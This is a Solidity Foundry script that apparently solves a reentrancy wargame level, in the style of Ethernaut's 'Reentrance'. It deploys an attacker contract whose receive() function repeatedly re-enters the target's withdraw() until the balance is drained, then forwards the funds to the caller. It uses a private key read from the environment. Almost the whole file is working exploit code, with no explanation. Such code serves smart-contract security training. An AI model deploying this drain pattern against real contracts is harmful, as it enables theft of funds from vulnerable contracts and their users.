// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";             


contract ReentranceScript is Script {

    Reentrance public reentrance;

    constructor() public {
        reentrance = Reentrance(payable(vm.envAddress("REENTRANCE_INSTANCE")));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");

        vm.startBroadcast(pk);
        // reentrance = new Reentrance();
        ReentranceExecutor re = new ReentranceExecutor{value: address(reentrance).balance+1}(reentrance);
        re.withdraw(address(this));
        vm.stopBroadcast();
    }

    // forge script script/reentrance.s.sol:ReentranceScript --broadcast
}

contract ReentranceExecutor {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) payable public {
        reentrance = _reentrance;
        reentrance.donate{value: msg.value}(address(this));
    }

    function withdraw(address to) public returns (bool callRes) {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
        (callRes, ) = to.call{value: address(this).balance}("");
    }

    receive() external payable {
        if (address(reentrance).balance > msg.value) 
            reentrance.withdraw(msg.value);
        else if (address(reentrance).balance > 0)
            reentrance.withdraw(address(reentrance).balance);
    }
}

